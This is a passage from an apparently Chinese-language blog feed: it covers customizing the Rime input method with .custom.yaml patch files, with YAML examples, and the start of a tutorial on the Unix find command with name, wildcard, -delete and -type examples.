alt="image-20200422195009516"></p><p>可以看到有一些custom字样的配置文件，这些custom是用来给功能打patch的。怎么解释呢。举个例子，在“程序文件夹”下有有一个default.yaml，这里配置了rime输入法的一些全局信息：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200422195201624.png" alt="image-20200422195201624"></p><p>如果我们想更改这些全局信息怎么办？ok，有同学会说，直接修改default.yaml呗。但是要注意，rime一旦升级default.yaml这个文件夹就会被覆盖。那到时候又去重新修改吗。另外，我们修改的可能布置default.yaml这个文件，前面说了，default.yaml是全局配置，也许我们需要对某个输入方案进行局部配置，那这些文件又会单独修改，最后整个配置文件一盘乱。一旦升级，哪些文件该修改，哪些文件不该修改，根本无从得知。</p><p>于是，rime采用patch的方法，来更改配置。</p><p>打patch的方式很简单，找到你要修改的文件:</p><p>全局配置-default.yaml</p><p>小狼毫-weasel.yaml</p><p>输入方案- xxx_schema.yaml</p><p>然后在用户目录下，建立相应的文件名.custom.yaml。如default.yaml–&gt;default.custom.yaml。weasel.yaml–&gt;weasel.custom.yaml。</p><h3 id="3-3-一些配置例子"><a href="#3-3-一些配置例子" class="headerlink" title="3.3 一些配置例子"></a>3.3 一些配置例子</h3><p>所有的配置采用yaml文件格式，不懂yaml的，请自行百度一下。</p><p>通过一些例子来说明如何打patch：</p><ol><li><p>更改全局默认候选词个数</p><p>全局配置，打开default.custom.yaml:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#patch</span></span><br><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">menu/page_size:</span> <span class="number">6</span><span class="comment"># 每个候选词改为6个</span></span><br><span class="line">  <span class="attr">schema_list:</span></span><br><span class="line">    <span class="bullet">-</span> &#123;<span class="attr">schema:</span> <span class="string">luna_pinyin</span>&#125;</span><br><span class="line">    <span class="bullet">-</span> &#123;<span class="attr">schema:</span> <span class="string">terra_pinyin</span>&#125;</span><br><span class="line">    <span class="bullet">-</span> &#123;<span class="attr">schema:</span> <span class="string">double_pinyin_flypy</span>&#125;</span><br><span class="line">    <span class="bullet">-</span> &#123;<span class="attr">schema:</span> <span class="string">easy_en</span>&#125;</span><br></pre></td></tr></table></figure></li><li><p>垂直候选词，改为水平候选词</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">&quot;style/horizontal&quot;:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></li><li><p>输入英文左shift直接上屏，默认情况下，输入英文然后左shift是不上屏的，还需要按一下回车。我们可以修改：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="attr">&quot;ascii_composer/good_old_caps_lock&quot;:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">&quot;ascii_composer/switch_key&quot;:</span></span><br><span class="line">    <span class="attr">Caps_Lock:</span> <span class="string">clear</span></span><br><span class="line">    <span class="attr">Control_L:</span> <span class="string">noop</span></span><br><span class="line">    <span class="attr">Control_R:</span> <span class="string">noop</span></span><br><span class="line">    <span class="attr">Shift_L:</span> <span class="string">commit_code</span></span><br><span class="line">    <span class="attr">Shift_R:</span> <span class="string">inline_ascii</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>将朙月拼音的所有中文标点符号换为英文符号. </p><ol><li><p>导入alternative.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Rime alternative settings</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># difference from default settings:</span></span><br><span class="line"><span class="comment"># 1. ascii-style punctuation in half-shape mode</span></span><br><span class="line"><span class="comment"># 2. [ ] as paging keys</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># save this file as:</span></span><br><span class="line"><span class="comment"># (Linux)   ~/.config/ibus/rime/alternative.yaml</span></span><br><span class="line"><span class="comment"># (Mac OS)  ~/Library/Rime/alternative.yaml</span></span><br><span class="line"><span class="comment"># (Windows) &quot;%APPDATA%\Rime\alternative.yaml&quot;</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># edit &lt;SCHEMA_ID&gt;.custom.yaml:</span></span><br><span class="line"><span class="comment"># &gt;&gt; patch:</span></span><br><span class="line"><span class="comment"># &gt;&gt;   &#x27;punctuator/import_preset&#x27;: alternative</span></span><br><span class="line"><span class="comment"># &gt;&gt;   &#x27;key_binder/import_preset&#x27;: alternative</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for detailed explanation, refer to:</span></span><br><span class="line"><span class="comment"># http://code.google.com/p/rimeime/wiki/CustomizationGuide#%E4%BD%BF%E7%94%A8%E5%85%A8%E5%A5%97%E8%A5%BF%E6%96%87%E6%A8%99%E9%BB%9E </span></span><br><span class="line"></span><br><span class="line"><span class="attr">config_version:</span> <span class="string">&quot;0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">punctuator:</span></span><br><span class="line">  <span class="attr">full_shape:</span></span><br><span class="line">    <span class="string">&quot; &quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;　&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;,&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">，</span> &#125;</span><br><span class="line">    <span class="string">&quot;.&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">。</span> &#125;</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span> <span class="string">:</span> [ <span class="string">《</span>, <span class="string">〈</span>, <span class="string">«</span>, <span class="string">‹</span> ]</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span> <span class="string">:</span> [ <span class="string">》</span>, <span class="string">〉</span>, <span class="string">»</span>, <span class="string">›</span> ]</span><br><span class="line">    <span class="string">&quot;/&quot;</span> <span class="string">:</span> [ <span class="string">、</span>, <span class="string">／</span>, <span class="string">&quot;/&quot;</span>, <span class="string">÷</span> ]</span><br><span class="line">    <span class="string">&quot;?&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">？</span> &#125;</span><br><span class="line">    <span class="string">&quot;;&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">；</span> &#125;</span><br><span class="line">    <span class="string">&quot;:&quot;</span> <span class="string">:</span> <span class="string">：</span></span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span> <span class="string">:</span> &#123; <span class="attr">pair:</span> [ <span class="string">&quot;‘&quot;</span>, <span class="string">&quot;’&quot;</span> ] &#125;</span><br><span class="line">    <span class="string">&quot;\&quot;&quot;</span> <span class="string">:</span> &#123; <span class="attr">pair:</span> [ <span class="string">&quot;“&quot;</span>, <span class="string">&quot;”&quot;</span> ] &#125;</span><br><span class="line">    <span class="string">&quot;\\&quot;</span> <span class="string">:</span> [ <span class="string">、</span>, <span class="string">＼</span>, <span class="string">&quot;\\&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;|&quot;</span> <span class="string">:</span> [ <span class="string">・</span>, <span class="string">｜</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;§&quot;</span>, <span class="string">&quot;¦&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;`&quot;</span> <span class="string">:</span> [ <span class="string">｀</span>, <span class="string">&quot;`&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;~&quot;</span> <span class="string">:</span> [ <span class="string">〜</span>, <span class="string">&quot;~&quot;</span>, <span class="string">～</span>, <span class="string">〰</span> ]</span><br><span class="line">    <span class="string">&quot;!&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">！</span> &#125;</span><br><span class="line">    <span class="string">&quot;@&quot;</span> <span class="string">:</span> [ <span class="string">＠</span>, <span class="string">&quot;@&quot;</span>, <span class="string">☯</span> ]</span><br><span class="line">    <span class="string">&quot;#&quot;</span> <span class="string">:</span> [ <span class="string">＃</span>, <span class="string">&quot;#&quot;</span>, <span class="string">⌘</span> ]</span><br><span class="line">    <span class="string">&quot;%&quot;</span> <span class="string">:</span> [ <span class="string">％</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;°&quot;</span>, <span class="string">&quot;℃&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;$&quot;</span> <span class="string">:</span> [ <span class="string">￥</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;€&quot;</span>, <span class="string">&quot;£&quot;</span>, <span class="string">&quot;¥&quot;</span>, <span class="string">&quot;¢&quot;</span>, <span class="string">&quot;¤&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;^&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">……</span> &#125;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span> <span class="string">:</span> [ <span class="string">＆</span>, <span class="string">&quot;&amp;&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;*&quot;</span> <span class="string">:</span> [ <span class="string">＊</span>, <span class="string">&quot;*&quot;</span>, <span class="string">・</span>, <span class="string">×</span>, <span class="string">※</span>, <span class="string">❂</span>, <span class="string">·</span> ]</span><br><span class="line">    <span class="string">&quot;(&quot;</span> <span class="string">:</span> <span class="string">（</span></span><br><span class="line">    <span class="string">&quot;)&quot;</span> <span class="string">:</span> <span class="string">）</span></span><br><span class="line">    <span class="string">&quot;-&quot;</span> <span class="string">:</span> [ <span class="string">－</span>, <span class="string">&quot;-&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;_&quot;</span> <span class="string">:</span> <span class="string">——</span></span><br><span class="line">    <span class="string">&quot;+&quot;</span> <span class="string">:</span> [ <span class="string">＋</span>, <span class="string">&quot;+&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;=&quot;</span> <span class="string">:</span> [ <span class="string">＝</span>, <span class="string">&quot;=&quot;</span> ]</span><br><span class="line">    <span class="string">&quot;[&quot;</span> <span class="string">:</span> [ <span class="string">「</span>, <span class="string">【</span>, <span class="string">〔</span>, <span class="string">［</span> ]</span><br><span class="line">    <span class="string">&quot;]&quot;</span> <span class="string">:</span> [ <span class="string">」</span>, <span class="string">】</span>, <span class="string">〕</span>, <span class="string">］</span> ]</span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span> <span class="string">:</span> [ <span class="string">『</span>, <span class="string">〖</span>, <span class="string">｛</span> ]</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span> <span class="string">:</span> [ <span class="string">』</span>, <span class="string">〗</span>, <span class="string">｝</span> ]</span><br><span class="line">  <span class="attr">half_shape:</span></span><br><span class="line">    <span class="string">&quot;,&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;,&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;.&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span> <span class="string">:</span> <span class="string">&quot;&lt;&quot;</span></span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span> <span class="string">:</span> <span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    <span class="string">&quot;/&quot;</span> <span class="string">:</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="string">&quot;?&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;?&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;;&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;;&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;:&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;:&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span> <span class="string">:</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="string">&quot;\&quot;&quot;</span> <span class="string">:</span> <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;\\&quot;</span> <span class="string">:</span> <span class="string">&quot;\\&quot;</span></span><br><span class="line">    <span class="string">&quot;|&quot;</span> <span class="string">:</span> <span class="string">&quot;|&quot;</span></span><br><span class="line">    <span class="string">&quot;`&quot;</span> <span class="string">:</span> <span class="string">&quot;`&quot;</span></span><br><span class="line">    <span class="string">&quot;~&quot;</span> <span class="string">:</span> <span class="string">&quot;~&quot;</span></span><br><span class="line">    <span class="string">&quot;!&quot;</span> <span class="string">:</span> &#123; <span class="attr">commit:</span> <span class="string">&quot;!&quot;</span> &#125;</span><br><span class="line">    <span class="string">&quot;@&quot;</span> <span class="string">:</span> <span class="string">&quot;@&quot;</span></span><br><span class="line">    <span class="string">&quot;#&quot;</span> <span class="string">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line">    <span class="string">&quot;%&quot;</span> <span class="string">:</span> <span class="string">&quot;%&quot;</span></span><br><span class="line">    <span class="string">&quot;$&quot;</span> <span class="string">:</span> <span class="string">&quot;$&quot;</span></span><br><span class="line">    <span class="string">&quot;^&quot;</span> <span class="string">:</span> <span class="string">&quot;^&quot;</span></span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span> <span class="string">:</span> <span class="string">&quot;&amp;&quot;</span></span><br><span class="line">    <span class="string">&quot;*&quot;</span> <span class="string">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">    <span class="string">&quot;(&quot;</span> <span class="string">:</span> <span class="string">&quot;(&quot;</span></span><br><span class="line">    <span class="string">&quot;)&quot;</span> <span class="string">:</span> <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="string">&quot;-&quot;</span> <span class="string">:</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">    <span class="string">&quot;_&quot;</span> <span class="string">:</span> <span class="string">&quot;_&quot;</span></span><br><span class="line">    <span class="string">&quot;+&quot;</span> <span class="string">:</span> <span class="string">&quot;+&quot;</span></span><br><span class="line">    <span class="string">&quot;=&quot;</span> <span class="string">:</span> <span class="string">&quot;=&quot;</span></span><br><span class="line">    <span class="string">&quot;[&quot;</span> <span class="string">:</span> <span class="string">&quot;[&quot;</span></span><br><span class="line">    <span class="string">&quot;]&quot;</span> <span class="string">:</span> <span class="string">&quot;]&quot;</span></span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span> <span class="string">:</span> <span class="string">&quot;&#123;&quot;</span></span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span> <span class="string">:</span> <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">key_binder:</span></span><br><span class="line">  <span class="attr">bindings:</span></span><br><span class="line">    <span class="comment"># commonly used paging keys</span></span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">composing</span>, <span class="attr">accept:</span> <span class="string">ISO_Left_Tab</span>, <span class="attr">send:</span> <span class="string">Page_Up</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">composing</span>, <span class="attr">accept:</span> <span class="string">Shift+Tab</span>, <span class="attr">send:</span> <span class="string">Page_Up</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">composing</span>, <span class="attr">accept:</span> <span class="string">Tab</span>, <span class="attr">send:</span> <span class="string">Page_Down</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">has_menu</span>, <span class="attr">accept:</span> <span class="string">minus</span>, <span class="attr">send:</span> <span class="string">Page_Up</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">has_menu</span>, <span class="attr">accept:</span> <span class="string">equal</span>, <span class="attr">send:</span> <span class="string">Page_Down</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">paging</span>, <span class="attr">accept:</span> <span class="string">comma</span>, <span class="attr">send:</span> <span class="string">Page_Up</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">has_menu</span>, <span class="attr">accept:</span> <span class="string">period</span>, <span class="attr">send:</span> <span class="string">Page_Down</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">paging</span>, <span class="attr">accept:</span> <span class="string">bracketleft</span>, <span class="attr">send:</span> <span class="string">Page_Up</span> &#125;</span><br><span class="line">    <span class="bullet">-</span> &#123; <span class="attr">when:</span> <span class="string">has_menu</span>, <span class="attr">accept:</span> <span class="string">bracketright</span>, <span class="attr">send:</span> <span class="string">Page_Down</span> &#125;</span><br></pre></td></tr></table></figure></li><li><p>然后在luna_pinyin.custom.yaml下打patch:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="comment"># 替换所有中文标点符号为英文</span></span><br><span class="line">  <span class="attr">punctuator/import_preset:</span> <span class="string">alternative</span> <span class="comment"># default 还原</span></span><br></pre></td></tr></table></figure></li></ol><p>ok,相信到这里,已经能多少配置rime的一些东西. 具体的有哪些可以配置可以参考官方.</p></li></ol><h2 id="4-同文输入法"><a href="#4-同文输入法" class="headerlink" title="4.同文输入法"></a>4.同文输入法</h2><p>相比pc端的rime,移动端的输入法,更有可玩性.</p><p>Android端的rime叫做同文输入法.</p><p>和pc端的所有配置都一样, 不过有一些移动端特有的配置.</p><p>比如, 键位配置, 九宫格?26位? 14位? 扩展键位? 等等等等. 又比如皮肤设计?自定义词库(pc也可以)等等.</p><p>所有配置, 同文的wiki比 rimewiki还是容易读多了:</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29zZmFucy90cmltZS93aWtpL3RyaW1lLnlhbWwlRTglQTklQjMlRTglQTclQTM=" title="https://github.com/osfans/trime/wiki/trime.yaml%E8%A9%B3%E8%A7%A3">https://github.com/osfans/trime/wiki/trime.yaml詳解<i class="fa fa-external-link"></i></span></p><p>另外,同文输入法还有一个优势在于, “小鹤音形”输入方案.该方案目前仅在rime上登录,采用双拼+形码提升打字速度. </p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rime输入法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>find命令详解</title>
      <link href="/archives/be26ae40.html"/>
      <url>/archives/be26ae40.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-Q-amp-A"><a href="#1-Q-amp-A" class="headerlink" title="1. Q&amp;A"></a>1. Q&amp;A</h2><ul><li>我几天前下的pdf文档，txt文件等放在哪儿了？</li><li>今天我创建了哪些文件？</li><li>某个目录下的markdown文件一共有多少个？</li><li>如何批量删除符合条件的文件?</li></ul><p>上面这些问题通通都可以使用<strong>find命令</strong>来解决。</p><blockquote><p>find命令在类unix系统下都可以使用，windows平台可通过安装cygwin等仿linux环境来使用。</p></blockquote><a id="more"></a><h2 id="2-find命令"><a href="#2-find命令" class="headerlink" title="2.  find命令"></a>2.  find命令</h2><h2 id="2-1-what-is-find-command"><a href="#2-1-what-is-find-command" class="headerlink" title="2.1 what is find command?"></a>2.1 what is find command?</h2><p><img data-src="https://shapeshed.com/images/articles/find.png" alt="find man page"></p><h2 id="2-2-通过文件名来搜索文件"><a href="#2-2-通过文件名来搜索文件" class="headerlink" title="2.2 通过文件名来搜索文件"></a>2.2 通过文件名来搜索文件</h2><p>可以通过<code>-name</code>参数来完全匹配单个文件，或使用通配符来批量匹配一批文件。</p><p>实验环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── bar</span><br><span class="line">├── baz</span><br><span class="line">│   ├── file1</span><br><span class="line">│   ├── file10</span><br><span class="line">│   ├── file2</span><br><span class="line">│   ├── file3</span><br><span class="line">│   ├── file4</span><br><span class="line">│   ├── file5</span><br><span class="line">│   ├── file6</span><br><span class="line">│   ├── file7</span><br><span class="line">│   ├── file8</span><br><span class="line">│   └── file9</span><br><span class="line">└── bop</span><br></pre></td></tr></table></figure><ol><li>完全匹配单个文件</li></ol><p>假如我们要找到file1这个文件的路径，则可以这样使用:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;file1&quot;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./baz/file1</span><br></pre></td></tr></table></figure><ol start="2"><li>批量匹配</li></ol><p>我们要找到filex{x&lt;10}的文件，则可以使用占位符?,如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;file?&quot;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./baz/file1</span><br><span class="line">./baz/file2</span><br><span class="line">./baz/file3</span><br><span class="line">./baz/file4</span><br><span class="line">./baz/file5</span><br><span class="line">./baz/file6</span><br><span class="line">./baz/file7</span><br><span class="line">./baz/file8</span><br><span class="line">./baz/file9</span><br></pre></td></tr></table></figure><p>假如我们要找所有以file开头的文件，则可以使用通配符*，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;file*&quot;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;baz&#x2F;file1</span><br><span class="line">.&#x2F;baz&#x2F;file10</span><br><span class="line">.&#x2F;baz&#x2F;file2</span><br><span class="line">.&#x2F;baz&#x2F;file3</span><br><span class="line">.&#x2F;baz&#x2F;file4</span><br><span class="line">.&#x2F;baz&#x2F;file5</span><br><span class="line">.&#x2F;baz&#x2F;file6</span><br><span class="line">.&#x2F;baz&#x2F;file7</span><br><span class="line">.&#x2F;baz&#x2F;file8</span><br><span class="line">.&#x2F;baz&#x2F;file9</span><br></pre></td></tr></table></figure><h2 id="2-3-删除符合条件的文件"><a href="#2-3-删除符合条件的文件" class="headerlink" title="2.3 删除符合条件的文件"></a>2.3 删除符合条件的文件</h2><p>假如我们要删除所有以file开头的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;file*&quot; -delete</span><br></pre></td></tr></table></figure><h2 id="2-4-指定搜索类型（目录or文件？"><a href="#2-4-指定搜索类型（目录or文件？" class="headerlink" title="2.4 指定搜索类型（目录or文件？)"></a>2.4 指定搜索类型（目录or文件？)</h2><p>我们可以通过-type参数，来指定我们搜索的文件是目录还是文件：</p><ul><li>-type f 文件</li><li>-type d 目录</li></ul><p>假设当前我们的实验环境为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">├── bar</span><br><span class="line">├── baz-- 下面的filex 全是文件</span><br><span class="line">│   ├── file1</span><br><span class="line">│   ├── file10</span><br><span class="line">│   ├── file2</span><br><span class="line">│   ├── file3</span><br><span class="line">│   ├── file4</span><br><span class="line">│   ├── file5</span><br><span class="line">│   ├── file6</span><br><span class="line">│   ├── file7</span><br><span class="line">│   ├── file8</span><br><span class="line">│   └── file9</span><br><span class="line">└── bop-- 下面的filex 全是目录</span><br><span class="line">    ├── file1</span><br><span class="line">    ├── file10</span><br><span class="line">    ├── file2</span><br><span class="line">    ├── file3</span><br><span class="line">    ├── file4</span><br><span class="line">    ├── file5</span><br><span class="line">    ├── file6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则，我们要找所有的文件类型file时:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;file*&quot; -type f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;baz&#x2F;file1</span><br><span class="line">.&#x2F;baz&#x2F;file10</span><br><span class="line">.&#x2F;baz&#x2F;file2</span><br><span class="line">.&#x2F;baz&#x2F;file3</span><br><span class="line">.&#x2F;baz&#x2F;file4</span><br><span class="line">.&#x2F;baz&#x2F;file5</span><br><span class="line">.&#x2F;baz&#x2F;file6</span><br><span class="line">.&#x2F;baz&#x2F;file7</span><br><span class="line">.&#x2F;baz&#x2F;file8</span><br><span class="line">.&#x2F;baz&#x2F;file9</span><br></pre></td></tr></table></figure><p>要找所有目录类型的file时：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -name &quot;file*&quot; -type d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bop&#x2F;file1</span><br><span class="line">.&#x2F;bop&#x2F;file10</span><br><span class="line">.&#x2F;bop&#x2F;file2</span><br><span class="line">.&#x2F;bop&#x2F;file3</span><br><span class="line">.&#x2F;bop&#x2F;file4</span><br><span class="line">.&#x2F;bop&#x2F;file5</span><br><span 